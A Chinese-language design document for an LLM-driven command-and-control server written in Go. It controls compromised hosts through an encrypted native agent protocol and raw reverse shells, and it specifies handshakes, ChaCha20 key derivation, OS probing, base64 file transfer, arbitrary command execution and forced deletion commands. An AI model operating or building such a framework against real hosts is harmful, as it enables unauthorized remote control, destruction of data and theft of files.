# C2Agent 系统设计文档

> 状态：**v1.0 已定稿（审核通过 2026-09-26）**
> 范围：以 **Go** 编写的控制端（C2），同时支持两类受控端：
> **A. 原生协议 Agent**（复用 `remote/remote-c`、`remote/remote-py`）与
> **B. 反弹 Shell Bot**（沿用 demo `Infection` 的裸 shell 直连方案）。
> 两类受控端**独立配置、独立监听、并存运行**，用户按实际情况选择。

---

## 0. 修订记录

| 版本 | 日期 | 说明 |
| ---- | ---- | ---- |
| v0.1 | 2026-09-26 | 初稿：整合早期两版 Python 实验（二进制协议 + 反弹 Shell），控制端改为 Go，支持双受控端并存；LLM 采用原生 Tool/Function Calling |
| v0.2 | 2026-09-26 | 完善：每 Agent 支持**多会话**（会话彼此独立）；同一 Agent 的指令以**线性队列**下发执行并回传对应会话；**排队等待不超时、执行中受超时限制** |
| v0.3 | 2026-09-26 | 技术选型：LLM 使用官方库 **`github.com/openai/openai-go`** |
| v0.4 | 2026-09-26 | **去除 Wails**（依赖 CGO/webview，阻碍交叉编译）；前端回归 **headless HTTP + SSE + `go:embed`**，保证 `CGO_ENABLED=0` 跨平台交叉编译 |
| v0.5 | 2026-09-26 | 项目更名为 **C2Agent**（module `c2agent`、产物 `c2agent`、shell marker `__C2AGENT_<hex>__`） |
| v0.6 | 2026-09-26 | `read_file` 整文件读取截断上限由 50000 调整为 **51200 字符**（同步改 `remote/` 常量）；明确复用策略：`remote/` **仅允许常量/参数级微调，协议与核心流程不变** |
| v0.7 | 2026-09-26 | 统一两类受控端下载落盘逻辑：一律 `dl_temp_dir/<basename(srcPath)>`，**重名覆盖**，失败删半成品 |
| v1.0 | 2026-09-26 | 16 项审核点全部确认，设计**定稿**，进入编码 |
| v1.1 | 2026-10-09 | 加密升级：Native 链路的 ChaCha20 key+nonce 改为**由握手 nonce 逐连接派生**（一次一密），双向以 `dir` 标记隔离；握手报文格式不变、硬切不保留旧静态方案（§5.2 / §11.3）|

---

## 1. 设计目标

将两版 Python 实验（二进制协议 + 反弹 Shell）统一到一个
**Go 控制端**中，实现：

1. **控制端 Go 化**：单一 Go 二进制，跨平台（Windows/Linux/macOS），性能与部署优于 Python。
2. **双受控端并存**：同一 C2 进程可同时监听
   - 原生协议端口（对接 `remote-c` / `remote-py`，二进制协议 + ChaCha20 加密）；
   - 反弹 Shell 端口（对接裸 shell，明文行协议 + marker 定界）。
   两类 Agent 进入同一注册表，对上层会话/UI 呈现一致的操作体验，但**连接配置相互独立**。
3. **LLM 驱动**：通过 OpenAI 兼容 API 的 **原生 Tool / Function Calling** 让模型决策并下发动作，
   结果回灌模型续轮。
4. **多 Agent + 多会话**：每个 Agent 可挂多个**彼此独立**的会话（各自历史/轮数/授权/停止）；
   同一 Agent 的指令以**每 Agent 一条线性队列**串行下发，结果回传**发起它的会话**；不同 Agent 队列独立、可并发。
5. **队列超时语义**：指令在队列中**排队等待不受超时限制**；**开始执行后才受 `cmd_timeout` 限制**。
6. **CLI + Web 双模式**：交互式 CLI 与浏览器 Web 面板（HTTP + SSE + `go:embed` 内嵌前端；多会话标签、流式对话、会话管理、文件管理器、授权弹窗、Agent 切换）。
   LLM 调用统一使用官方库 **`github.com/openai/openai-go`**。
7. **复用为主、微小改动**：现有 `remote/` 受控端的**协议报文格式、编解码、调度等主流程保持不变**（Go C2 逐字节兼容）；
   允许常量/参数级微调（如 `READ_FILE_LIMIT = 51200`）。**例外**：按 v1.1，握手流程与 ChaCha20 的 key/nonce
   派生统一升级为「一次一密」（见 §5.2），控制端与三个受控端同步硬切，不保留旧版兼容。

**非目标（本期）**：不提供受控端本地 UI（受控端永远无头）；不做生产级抗审查。

### 1.1 技术选型

| 领域 | 选型 | 说明 |
| ---- | ---- | ---- |
| 语言 | **Go 1.22+** | 控制端单一二进制；受控端复用现有 C/Python |
| LLM SDK | **`github.com/openai/openai-go`（官方库）** | 流式 chat completions + tools；`option.WithBaseURL` 兼容任意 OpenAI 兼容端点 |
| Web 前端 | **net/http + SSE + `go:embed`** | 纯 Go、零 CGO；浏览器访问，可 `CGO_ENABLED=0` 交叉编译 |
| 二进制协议 | 自实现（`internal/protocol` + `internal/crypto`） | 与 `remote/` 逐字节兼容 |
| CLI | 标准库 `flag` + `bufio` | 无额外依赖 |

> **交叉编译约束**：全部依赖纯 Go、**不引入 CGO**。使用
> `CGO_ENABLED=0 GOOS=... GOARCH=... go build` 即可产出 Windows / Linux / macOS（amd64/arm64）
> 单文件二进制；前端以 `go:embed` 编译进二进制，无需外部资源文件。

---

## 2. 术语

| 术语 | 含义 |
| ---- | ---- |
| C2 / 控制端 | Go 编写的控制程序（本项目核心） |
| Agent / 受控端 | 被控主机上的执行体，分 Native 与 Shell 两类 |
| Native Agent | 运行 `remote-c`/`remote-py`、使用二进制协议的受控端 |
| Shell Bot | 裸反弹 shell（bash/nc/powershell 等），无本地程序 |
| Backend | Go 侧对某类受控端的抽象，屏蔽协议差异 |
| 会话 | 绑定到某 Agent 的一段独立 LLM 对话（历史/轮数/授权/停止均独立）；一个 Agent 可有多个会话 |
| 指令队列 | 每 Agent 一条 FIFO 队列，串行化该 Agent 上的命令/文件传输；不同 Agent 队列独立 |
| Job | 入队的一个待执行操作（动作/上传/下载/关闭/直连命令），携带来源会话与结果通道 |
| Tool Call | OpenAI tools API 返回的结构化动作调用 |
| 轮次 | 一次「LLM 生成 → 动作执行 → 结果回灌」循环 |

---

## 3. 总体架构

### 3.1 组件图

```
┌──────────────────────────────── C2（Go 单一进程）────────────────────────────────┐
│                                                                                │
│  ┌────────────┐    ┌──────────────┐    ┌──────────────┐    ┌────────────────┐  │
│  │  CLI       │    │  Web (HTTP)  │    │ LLM Client   │    │  Tool Schema   │  │
│  │  loop      │◄──►│  + SSE +     │◄──►│ openai-go    │    │  (actions →    │  │
│  │            │    │  embed UI    │    │ (official)   │    │   functions)   │  │
│  └─────┬──────┘    └──────┬───────┘    └──────┬───────┘    └────────┬───────┘  │
│        │                  │                   │                     │          │
│        └────────┬─────────┴───────────────────┴─────────────────────┘          │
│                 │                                                              │
│         ┌───────▼────────────────────────────────────────────┐                 │
│         │   Engine（多会话编排 / 授权 / 轮数 / 事件广播）        │                 │
│         │   per-Agent: [ 会话A goroutine | 会话B | ... ]        │                 │
│         │   各会话独立历史 / 轮数 / 授权 / 停止                  │                 │
│         └───────┬────────────────────────────────────────────┘                 │
│                 │  Job 入队（携带 source session + result chan）               │
│         ┌───────▼───────────┐        ┌──────────────────────────┐              │
│         │   AgentRegistry   │        │   Command / Policy       │              │
│         │  统一 Agent 视图   │        │  动作定义·风险·安全检查   │              │
│         │  每 Agent 一条     │        └──────────────────────────┘              │
│         │  线性指令队列 +    │                                                  │
│         │  dispatcher       │                                                  │
│         └───────┬───────────┘                                                  │
│                 │                                                              │
│     ┌───────────┴─────────────┐                                               │
│     │       Backend 抽象       │                                               │
│     ├──────────────┬──────────┤                                               │
│     │ NativeBackend│ ShellBack│                                               │
│     └──────┬───────┴────┬─────┘                                               │
│            │            │                                                     │
│     ┌──────▼─────┐ ┌────▼──────┐                                              │
│     │NativeServer│ │ShellServer│   ← 两个独立 TCP 监听 / 独立配置              │
│     │ :8881      │ │ :8882     │                                              │
│     └──────┬─────┘ └────┬──────┘                                              │
└────────────┼────────────┼──────────────────────────────────────────────────── ┘
             │ 二进制协议  │ 明文行协议 + echo marker
             │ + ChaCha20 │
      ┌──────▼─────┐ ┌────▼──────────────────┐
      │ Native     │ │ 裸反弹 Shell          │
      │ Agent      │ │ (bash/nc/powershell)  │
      │ (remote-c/ │ │                       │
      │  remote-py)│ │                       │
      └────────────┘ └───────────────────────┘
```

### 3.2 两类受控端对照

| 维度 | A. Native Agent | B. Shell Bot |
| ---- | --------------- | ------------ |
| 受控端程序 | `remote-c` 或 `remote-py` | 无（裸 shell） |
| 传输 | 二进制包（16B 头 + TLV） | 明文文本行 |
| 加密 | 认证后 ChaCha20 全流量 | 无 |
| 鉴权 | 挑战-响应（sha256(nonce+token)） | 无（连接即可） |
| 在线判定 | 心跳 + watchdog | 连接存在即在线 |
| 编号 | 由 Agent 上报 `agent_id` | C2 分配 `BOT-XXX` |
| OS | Agent 上报 | C2 探测（uname/powershell/sw_vers） |
| 动作执行 | 数值 cmd 码 → 本地文件/Shell | 动作 → 单条 shell 命令字符串 |
| 文件传输 | 1024B 二进制数据包 | base64 拼进单条 shell 指令 |
| 适用场景 | 可部署执行体、需加密与稳定传输 | 已获得 shell、追求"零落地" |

两类受控端**互不干扰**：各自独立监听端口、独立配置项、独立连接生命周期；
用户在 Web 面板 / CLI 中统一看到并切换，C2 按 Agent 的 `Kind` 自动选择 Backend。

### 3.3 数据流（一次 LLM 工具调用）

```
用户消息 ──► Engine(该会话的 goroutine) ──► LLM(带 tools)
                                        │
                          assistant.tool_calls[] (可能流式)
                                        │
                     ┌──────────────────┴──────────────────┐
                     │ 逐 tool_call:                        │
                     │  · 安全检查（exec_cmd / 生成命令）    │
                     │  · 授权判定（按 auth_mode）           │
                     │  · 封装 Job{来源会话, 结果通道}        │
                     │  · 入该 Agent 线性指令队列（排队不超时）│
                     │  · 等待本 Job 结果（执行中受超时）     │
                     │  · 结果写入本会话（role=tool）         │
                     └──────────────────┬──────────────────┘
                                        │
                     回灌 LLM 续轮（受本会话 round_limit 约束）
                                        │
                        无 tool_calls → 结束本轮，等待用户

说明：同一 Agent 的多个会话可同时思考（LLM 调用并发），
      但它们产生的 Job 在该 Agent 的队列中 FIFO 串行执行；
      执行结果只回传给发起该 Job 的会话，互不串扰。
```

---

## 4. 项目结构（Go）

```
C2Agent/
├── design.md                     # 本文档
├── go.mod                        # module c2agent（Go 1.22+；依赖 openai-go，纯 Go 无 CGO）
├── README.md
├── config_c2.example.json        # C2 配置示例（含两类受控端）
├── cmd/
│   └── c2agent/
│       └── main.go               # 入口：--mode cli|web --config
├── internal/
│   ├── config/
│   │   └── config.go             # 配置加载/校验/默认值
│   ├── protocol/
│   │   ├── constants.go          # cmd 码、TLV、包头常量
│   │   ├── codec.go              # 头/TLV/请求/响应/数据包编解码
│   │   └── reader.go             # 流式 PacketReader（半包/粘包）
│   ├── crypto/
│   │   └── chacha20.go           # ChaCha20 + EncryptedConn
│   ├── agent/
│   │   ├── agent.go              # Agent 模型（传输层）+ Backend 接口
│   │   ├── queue.go              # 每 Agent 线性指令队列 Job + dispatcher
│   │   ├── registry.go           # Registry（RWMutex、active、事件）
│   │   ├── native/
│   │   │   ├── server.go         # TCP 监听 + 握手 + 读循环
│   │   │   └── backend.go        # forward / control / upload / download
│   │   └── shell/
│   │       ├── server.go         # TCP 监听 + OS 探测 + 行读取
│   │       ├── backend.go        # 单行请求 + marker 定界
│   │       └── shellcmd.go       # 动作 → shell 命令（按 OS）
│   ├── command/
│   │   └── command.go            # 动作用表：名称/参数/风险/安全检查
│   ├── llm/
│   │   └── client.go             # OpenAI 兼容客户端（stream+tools，含 tools schema 生成）
│   ├── engine/
│   │   ├── engine.go             # Engine：会话集合 + 授权/轮数 + 每 Agent 活动会话
│   │   ├── session.go            # Session 模型 + 会话循环（授权/轮数/工具执行）
│   │   └── events.go             # 订阅广播（SSE 事件，带 session+agent）
│   ├── web/
│   │   ├── server.go             # net/http 路由 + SSE + 文件 API
│   │   └── ui/                   # go:embed 内嵌前端静态资源
│   │       └── index.html
│   └── cli/
│       └── cli.go                # 交互式命令行
├── remote/                       # 受控端
│   ├── remote-c/                 # C 受控端
│   ├── remote-go/                # Go 受控端（独立 module）
│   ├── remote-py/                # Python 受控端
│   └── common/                   # Python 共享协议/加密
└── build/
    ├── build_all.sh              # 一次产出全部目标（控制端 + Go 受控端）
    └── build_all.bat
```

> Go module 名暂定 `c2agent`；如需发布可改为 `github.com/<user>/c2agent`。

---

## 5. 受控端 A：原生协议 Agent（复用 `remote/`）

### 5.1 二进制协议（与现有实现**逐字节兼容**）

**包头（固定 16 字节）**

| 偏移 | 长度 | 字段 | 说明 |
| ---- | ---- | ---- | ---- |
| 0 | 8 | `request_id` | uint64 LE，请求唯一标识，响应原样回填 |
| 8 | 4 | `body_len` | uint32 LE，包身字节数（0 表示无包身） |
| 12 | 3 | `reserved` | 置 0 |
| 15 | 1 | `cmd` / `end_flag` | 动作码 / 控制码 / 数据包结束标记 |

**包身**
- 请求（C2→Agent）：TLV 链，`uint32 LE length + UTF-8 data` × N。
- 响应（Agent→C2）：单一 UTF-8 字符串（不切分）。
- 数据包（文件传输）：原始字节（二进制安全）。

**动作指令码**（与 `common/protocol.py` 一致）

| cmd | 名称 | 参数顺序 |
| --- | ---- | -------- |
| 0x01 | list_dir | `path` |
| 0x02 | make_dir | `path` |
| 0x03 | delete_dir | `path` |
| 0x04 | rename_dir | `path`,`new_name` |
| 0x05 | read_file | `path`,`start_line`,`end_line` |
| 0x06 | write_file | `path`,`content` |
| 0x07 | delete_file | `path` |
| 0x08 | edit_file | `path`,`operation`,`start_line`,`end_line`,`content` |
| 0x09 | rename_file | `path`,`new_name` |
| 0x0A | copy | `src`,`dest` |
| 0x0B | move | `src`,`dest` |
| 0x0C | upload | `dest_path` |
| 0x0D | download | `src_path` |
| 0x0E | create_file | `path` |
| 0x0F | get_cwd | （无） |
| 0x10 | exec_cmd | `command` |

**控制指令码**

| cmd | 方向 | 名称 | 包身 |
| --- | ---- | ---- | ---- |
| 0x80 | Agent→C2 | register | `nonce`（仅随机串） |
| 0x81 | C2→Agent | register_response | `sha256(nonce+token)` 十六进制 |
| 0x82 | Agent→C2 | heartbeat | `timestamp` |
| 0x83 | C2→Agent | heartbeat_ack | `timestamp` |
| 0x84 | 双向 | disconnect | `reason` |
| 0x85 | C2→Agent | shutdown | `reason` |
| 0x86 | Agent→C2 | register_confirm | `agent_id`,`hostname`,`os`（已加密） |

- `read_file` 整文件读取截断至 **51200 字符**（50 KiB）。该限制在受控端强制：将
  `remote/remote-c`（`agent.h` 的 `READ_FILE_LIMIT`）与 `remote/remote-py`
  （`local_executor.py` 的 `[:50000]`）的常量同步为 **51200**（**常量级微调，主流程不变**）；
  超长文件由 LLM 用 `start_line`/`end_line` 分段读取。
- 数据包 `DATA_CHUNK_SIZE = 1024`，`end_flag`：0=续传，1=末包。
- 单个包体上限 **32 MiB**（`MaxBodyLen`）；超限视为协议异常并断开连接（防御畸形 `body_len`）。

### 5.2 注册握手与加密（复用现有语义）

```
Agent                                C2(Go)
  │── register(req=1, nonce) ────────►│  仅随机 nonce，不含身份
  │◀─ register_response(req=1,digest)─│  digest = sha256(nonce+token)
  │  本地校验 sha256(nonce+token)==digest? 否则断开
  │── register_confirm(req=2, ───────►│  ★已用 ChaCha20 加密（Agent→C2 第一段）
  │   agent_id,hostname,os)           │  → Registry.Register
  │═══ 此后全字节流 ChaCha20 加密 ════│
```

- 密钥与 nonce 均由**握手 nonce + token** 派生（两端本地计算，不上线）：
  - `key(dir) = SHA-256(nonce ‖ token ‖ nonce ‖ dir)`（32 字节，取满）；
  - `nonce(dir) = SHA-256(token ‖ nonce ‖ token ‖ dir)[0:12]`（12 字节，截取）。
  - `dir` 为方向标记（`0x01`=C2→Agent，`0x02`=Agent→C2），保证双向不共用密钥流。
  - 握手 nonce 每连接随机，故**每条连接使用唯一的一组 key+nonce（一次一密）**。
- 加密作用于**整条字节流**（含包头/包身/数据包），接收端先解密再分帧；counter 沿用现有连续自增设计。
- `register` / `register_response` 明文；`register_confirm` 起（含）加密。
- C2 侧 Go 需实现 `EncryptedConn`：包装 `net.Conn` 的 `Read`/`Write` 做流式加解密，
  并在 `_wait_confirm` 阶段复用同一个 rx 上下文（处理 confirm 与首个加密包 TCP 合并到达）。

### 5.3 文件传输

- **upload（C2→Agent）**：先发 `upload(dest_path)` 初始化包，再按 1024B 发送数据包，
  末包 `end_flag=1`，等待 Agent 最终响应（超时 60s）。
- **download（Agent→C2）**：发 `download(src_path)`；Agent 连续回数据包，
  C2 落盘到 `dl_temp_dir/<basename>`（重名覆盖），末包结束。
- 传输作为 Job 进入该 Agent 的线性指令队列（§7.5），与其他命令严格串行，避免协议交错。
- Go 实现要点：native server 读循环把数据包（`cmd`=0/1）推入 `data_queues[req_id]`（有界），
  非数据响应以 `("error", body)` 入队，供下载消费者抛错而非写入文件。

### 5.4 Go 侧实现要点

```go
// internal/protocol/constants.go
const (
    HeaderLen     = 16
    RequestIDOff  = 0    // uint64 LE
    BodyLenOff    = 8    // uint32 LE
    CmdOff        = 15   // uint8
    DataChunkSize = 1024
    ReadFileLimit = 51200
)

// internal/agent/native/backend.go（示意）
func (b *NativeBackend) Execute(ctx context.Context, action string, p map[string]any) (string, error) {
    code, ok := command.CodeFor(action)
    if !ok { return "", fmt.Errorf("unknown action: %s", action) }
    params := command.ParamsFor(action, p)     // 按固定顺序抽 TLV
    return b.forward(ctx, code, params)        // 由队列 dispatcher 串行调用；写锁保护字节流
}
```

---

## 6. 受控端 B：反弹 Shell Bot（裸 shell 直连）

### 6.1 明文行协议 + marker 定界

裸 shell 无协议，C2 以**随机 marker** 定界每次回复：

```
C2    -> shell:   ls -la /home/user
                  echo __C2AGENT_4f9a2b__
shell -> C2:      <交互式回显，若有>
                  drwxr-xr-x ... .
                  __C2AGENT_4f9a2b__
                  <下一个提示符>
```

- 每连接生成一个随机 marker（如 `__C2AGENT_<hex>__`）。
- 命令必须**单行**（换行合并为空格）。
- 读到 marker 行即视为本次响应结束；剥离交互回显、marker-echo 行、shell 提示符。
- **线性调度**：一个 Bot 同时只跑一条命令；忙时新请求直接拒绝（`agent busy`）。

### 6.2 OS 探测与编号

连接建立后立即探测（首个命中即停）：

| 探测 | 命令 | 关键词 | 结果 |
| ---- | ---- | ------ | ---- |
| 1 | `uname -s` | linux | Linux |
| 2 | `powershell -NoProfile -Command [Environment]::OSVersion.VersionString` | windows | Windows |
| 3 | `sw_vers` | macos | macOS |

随后执行 `hostname` 填充主机名；C2 分配 `BOT-001`、`BOT-002`… 编号。

### 6.3 动作 → Shell 命令（按 OS）

与 Infection 一致：所有 LLM 动作转为**单条 shell 命令**。

- `get_cwd`：`pwd` / `powershell "(Get-Location).Path"`
- `list_dir`：`ls -la` / PowerShell `Get-ChildItem` 表格
- `read_file`：`cat` / `sed -n` / Windows 取 base64 由 C2 解码
- `write_file`/upload：`printf '<b64>' | base64 -d > dest`（分段）/
  `[IO.File]::WriteAllBytes` + `AppendAllBytes`
- `delete`：`rm -rf` / `Remove-Item -Recurse -Force`
- `edit_file`：读 → C2 改行 → base64 写回
- `exec_cmd`：原样命令（安全检查）
- Windows 一律构造**无 `$` 的 PowerShell 调用**，兼容 cmd 与 PowerShell 两种反弹。
- `list_dir` 输出由 C2 `format_listing` 归一化为 `DIR/FILE <size> <name>`。

### 6.4 base64 文件传输

- 上传 = 读取文件 → base64 → 与解码保存命令合并为**一条指令**。
  - POSIX 分块 100000（受 `ARG_MAX` 限制）；Windows 分块 8000（受命令行长度限制）。
- 下载 = 执行 `base64 <file>`（Windows `[Convert]::ToBase64String`），C2 解码后
  **统一落盘到 `dl_temp_dir/<basename(srcPath)>`（重名覆盖）**，与 Native 端规则完全一致（§7.2）。
- 约束：Windows 上受外层 shell 命令行长度限制（cmd 约 6KB、PowerShell iex 约几十 KB）；
  路径含 `%name%` 变量模式时拒绝（cmd 无法安全转义）。

### 6.5 在线与关闭

- **无心跳**：连接存在即在线；socket 关闭即从注册表移除。
- **shutdown**：向 shell 写入 `exit`。

---

## 7. 统一 Agent 抽象

### 7.1 Agent 模型

```go
type Kind string
const (
    KindNative Kind = "native" // 二进制协议
    KindShell  Kind = "shell"  // 反弹 shell
)

// Agent 是"传输层 + 执行层"的载体，不持有对话历史（历史在 Session 中）。
type Agent struct {
    ID          string
    Kind        Kind
    Hostname    string
    OS          string
    ConnectedAt time.Time
    LastHB      time.Time

    Backend Backend           // 协议差异屏蔽（Native / Shell）

    // 并发
    writeMu   sync.Mutex      // 字节级写串行（心跳/响应/数据包不交错）
    activeOps int32           // 正在执行的 Job 计数（watchdog 跳过忙碌 Agent）

    // 线性指令队列（每 Agent 一条，见 §7.5 / §10）
    jobs    chan *Job
    stop    chan struct{}
    stopped sync.Once
}

func (a *Agent) Enqueue(j *Job) error // 入队（等待不超时；Agent 下线则失败）
func (a *Agent) runDispatcher()       // 单 goroutine：逐 Job 执行，执行中受 cmd_timeout
```

### 7.2 Backend 接口

```go
package agent

type Backend interface {
    Kind() Kind
    // Execute 执行一个高层动作（名称与 tools schema 一致）
    Execute(ctx context.Context, action string, params map[string]any) (string, error)
    // Upload / Download 文件传输
    Upload(ctx context.Context, localPath, destPath string) (string, error)
    // Download：两类受控端统一落到 <destDir>/<basename(srcPath)>，已存在则覆盖
    Download(ctx context.Context, srcPath, destDir string) (string, error)
    // Shutdown 关闭受控端进程/连接
    Shutdown(ctx context.Context) error
    // Close 关闭底层连接（watchdog / 主动断开）
    Close() error
}
```

- `NativeBackend`：转发数值 cmd、等待响应；错误分 `NetworkError`（超时/断连/协议异常）
  与业务错误（结果以 `Error:` 开头）。
- `ShellBackend`：`request()` 发送单行命令 + marker，等待定界回复；动作经 `shellcmd` 转换。
- **下载落盘统一规则（两类受控端一致）**：`Download(srcPath, destDir)` 一律写入
  `<destDir>/<basename(srcPath)>`，**重名直接覆盖**；`destDir` 缺省即 `dl_temp_dir`
  （配置空则程序工作目录 `downloads/`）。Native 端由数据包流式写盘，Shell 端取回 base64后解码写盘，
  **最终落盘路径与命名规则完全相同**。下载失败（超时/断连/源不存在）时删除半成品文件。

### 7.3 Registry

```go
type Registry struct {
    mu       sync.RWMutex
    agents   map[string]*Agent
    activeID string
    listeners []func(event string, a *Agent)
}
func (r *Registry) Register(a *Agent)   // 同 id 旧连接先关闭
func (r *Registry) Unregister(id string) // 若为 active，自动切到下一个并广播 active_changed
func (r *Registry) Get(id string) *Agent
func (r *Registry) List() []*Agent
func (r *Registry) SetActive(id string) bool
func (r *Registry) TouchHB(id string)
```

- 两类受控端均注册进同一 Registry，`Active` 指向当前操作的默认 Agent。
- `Register` 时为该 Agent 启动 `runDispatcher()`；`Unregister` 时关闭 `stop`：
  令所有排队/执行中的 Job 失败（`NetworkError`），唤醒下载消费者，并使各来源会话收到网络错误。
- Registry **不保存会话历史**；会话由 Engine 管理并按 `AgentID` 索引。

### 7.4 Session 模型（会话层，位于 Engine）

一个 Agent 可挂**多个彼此独立**的会话。每个会话拥有自己的对话历史、轮数计数、
授权等待、停止标志与运行任务；会话之间不共享任何可变状态。

```go
type SessionID string

type Phase string
const (
    PhaseIdle     Phase = "idle"
    PhaseLLM      Phase = "llm"
    PhaseExec     Phase = "exec"
    PhaseAuthWait Phase = "auth_wait"
    PhaseDone     Phase = "done"
)

type Session struct {
    ID        SessionID
    AgentID   string
    Title     string          // 由首条用户消息生成，便于 UI 展示
    CreatedAt time.Time

    mu        sync.Mutex
    history   []llm.Message   // 本会话独立历史
    phase     Phase
    iteration int             // 本会话 round 计数
    turn      int             // 单调递增（事件用）
    text      strings.Builder // 流式正文缓存
    pending   *Job            // 等待授权的动作
    stop      bool

    task      context.CancelFunc
}
```

Engine 维护：

```go
sessions      map[SessionID]*Session
agentIndex    map[string]map[SessionID]*Session // agent → 其全部会话
activeSession map[string]SessionID              // 每 Agent 当前活动会话（UI 默认）
```

- `NewSession(agentID)` / `CloseSession(id)` / `ListSessions(agentID)` / `SetActiveSession(agentID, id)`。
- 同一 Agent 的多个会话可**并发思考**（各自 goroutine 调用 LLM），互不阻塞。
- 会话的 `auth_mode` 为全局配置（可整体切换），但**授权等待是会话级**：
  多个会话可同时处于 `auth_wait`；Web 按会话分别弹窗，CLI 只处理当前活动会话。

### 7.5 指令队列（每 Agent 一条，线性执行）

```go
type JobType int
const (
    JobAction   JobType = iota // 动作指令
    JobUpload                  // 上传
    JobDownload                // 下载
    JobShutdown                // 关闭受控端
    JobDirect                  // CLI/Web 直连命令（不属任何会话）
)

type Job struct {
    ID         uint64
    Type       JobType
    SessionID  SessionID      // 来源会话；JobDirect 为空
    ToolCallID string         // LLM tool_call id（用于回填 tool 结果）
    Action     string         // 动作名（JobAction / JobDirect）
    Params     map[string]any

    LocalPath   string        // JobUpload 本地路径
    DestPath    string        // JobUpload 目标路径
    SrcPath     string        // JobDownload 远程路径
    DownloadDir string        // JobDownload 落盘目录

    ctx       context.Context
    cancel    context.CancelFunc
    cancelled atomic.Bool
    Result    chan JobResult  // 缓冲 1；执行结束投递
}

type JobResult struct {
    Output string
    Err    error
}
```

- **入队**：`agent.Enqueue(job)` 将 Job FIFO 投入 `jobs` channel；会话 goroutine 随后
  在 `job.Result` 上**无超时**等待。
- **出队**：Agent 的 `runDispatcher` 单 goroutine 取出队首 Job，调用 Backend 执行，
  结果投回 `job.Result`。同一 Agent 严格一次一个 Job，天然杜绝协议交错。
- **超时语义**（本次强化重点）：
  - **排队等待阶段不设超时**：Job 在 channel 中等待多久都有效，只受 Agent 下线/会话取消影响。
  - **执行阶段受超时**：dispatcher 在开始执行的瞬间用
    `context.WithTimeout(job.ctx, cmd_timeout)` 包裹 Backend 调用；超时后按
    `policy.timeout_action` 处理（见 §9.4）。
- **取消**：会话停止（Stop）或关闭时置 `job.cancelled`；尚未出队的 Job 被 dispatcher 跳过，
  正在执行的 Job 若 Backend 支持上下文取消则中断，否则等待其自然结束并丢弃结果。

---

## 8. LLM 与工具调用

### 8.1 工具定义（tools schema）

C2 将动作表编译为 OpenAI tools。每个动作一个 function：

```json
{
  "type": "function",
  "function": {
    "name": "exec_cmd",
    "description": "Execute a shell command on the target system and return its output.",
    "parameters": {
      "type": "object",
      "properties": {
        "command": {"type": "string", "description": "The shell command to run."}
      },
      "required": ["command"]
    }
  }
}
```

动作清单与参数（与第 2 节动作表一一对应）：

| action | 参数（required 加粗） |
| ------ | --------------------- |
| get_cwd | 无 |
| list_dir | **path**（可选，默认 `.`） |
| read_file | **path**, start_line, end_line |
| write_file | **path**, **content** |
| create_file | **path** |
| delete_file | **path** |
| delete_dir | **path** |
| make_dir | **path** |
| rename_file | **path**, **new_name** |
| rename_dir | **path**, **new_name** |
| edit_file | **path**, **operation**(add/del/modify), start_line, end_line, content |
| copy | **src**, **dest** |
| move | **src**, **dest** |
| exec_cmd | **command** |

- 工具定义由 `llm/client.go`（`BuildTools`）从 `command` 包的动作表**自动生成**，避免两处漂移。
- `system_prompt` 中 `{system_name}` 由 C2 按当前会话绑定 Agent 的 OS 替换；提示词不含 agent id/host。

### 8.2 会话循环

```go
// 每个 Session 一个 goroutine；sess 绑定 agentID。
for round := 0; round < cfg.RoundLimit; round++ {
    resp := llm.ChatStream(sess.history, tools, onContent) // 流式输出正文
    sess.history = append(sess.history, resp.Message)      // assistant（可能含 tool_calls）
    if len(resp.ToolCalls) == 0 { break }                  // 无动作 → 本轮结束

    for _, tc := range resp.ToolCalls {
        if sess.stopped() { return }
        action, params := tc.Name, parseArgs(tc.Arguments)
        if !command.CheckSafety(action, params) {
            appendTool(sess, tc.ID, "Error: blocked by safety check"); continue
        }
        if engine.RequiresAuth(action) {
            sess.phase = PhaseAuthWait; broadcast(sess, auth_required)
            if !sess.awaitAuth() {                          // 会话级授权等待
                // 拒绝：该动作**绝不下发**受控端。回灌拒绝结果供模型参考，
                // 同批其余 tool_call 补 skip 结果以保持消息序列合法，并结束本轮。
                appendToolRaw(sess, tc.ID, "Error: user denied command execution (not executed)")
                addTranscript(sess, "system", "Denied: "+action+" (not executed)")
                for _, rest := range resp.ToolCalls[i+1:] {
                    appendToolRaw(sess, rest.ID, "Error: skipped because a previous command was denied")
                }
                denied = true; break
            }
            round = 0                                       // 授权通过 → 本会话轮数清零
        }

        // 封装 Job 入该 Agent 的线性队列（排队不超时），再等待本 Job 结果（执行中受超时）。
        job := &Job{Type: JobAction, SessionID: sess.ID, ToolCallID: tc.ID,
                    Action: action, Params: params, Result: make(chan JobResult, 1)}
        if err := agent.Enqueue(job); err != nil {          // Agent 已下线
            appendTool(sess, tc.ID, "Error: agent offline"); continue
        }
        res := <-job.Result                                 // ★无超时等待（超时在 dispatcher 内）
        appendTool(sess, tc.ID, resultString(res))
    }
    if denied { break }
}
```

关键点：
- **并发思考、串行执行**：多个会话的 LLM 调用可并发；所有实际下发受该 Agent 的
  队列约束，FIFO 串行，结果按 `SessionID` 精确回传来源会话。
- 每轮 assistant 消息必须**原样**回填（含 `tool_calls`），tool 结果以
  `{"role":"tool","tool_call_id":...,"content":...}` 追加到**本会话**历史。
- 网络错误（`NetworkError`）→ 仅终止**本会话**，追加 `[Network Error: ...]` 系统消息；
  是否移除整个 Agent 取决于超时策略（§9.4）。若 Agent 下线，其所有会话均收到网络错误。
- 业务错误（结果以 `Error:` 开头）→ 作为正常 tool 结果回灌，由模型决定后续策略。
- 用户拒绝 → 该动作**绝不下发**受控端；追加 `Error: user denied command execution (not executed)`
  的 tool 结果供模型参考，同批未处理的 tool_call 补 skip 结果，并**结束本轮**（拒绝即停止，
  不允许模型在同一轮内绕过）。
- 无论会话以**正常/停止/错误（LLM 或网络）**何种方式结束，都**统一发送一次 `done`** 终止事件；
  结束后会话回到 `idle` 且清除停止标志，可直接继续对话（无需 Reset）。

### 8.3 流式解析与 openai-go

LLM 调用统一使用官方库 **`github.com/openai/openai-go`**（含流式与 tools 支持）。
客户端初始化（兼容任意 OpenAI 兼容端点，如 Ollama / vLLM / DeepSeek）：

```go
import (
    "github.com/openai/openai-go"
    "github.com/openai/openai-go/option"
)

client := openai.NewClient(
    option.WithAPIKey(cfg.APIKey),
    option.WithBaseURL(cfg.APIBase),
)
stream := client.Chat.Completions.NewStreaming(ctx, openai.ChatCompletionNewParams{
    Model:       openai.ChatModel(cfg.Model),
    Messages:    msgs,   // []openai.ChatCompletionMessageParamUnion
    Tools:       tools,  // []openai.ChatCompletionToolParam（由动作表生成）
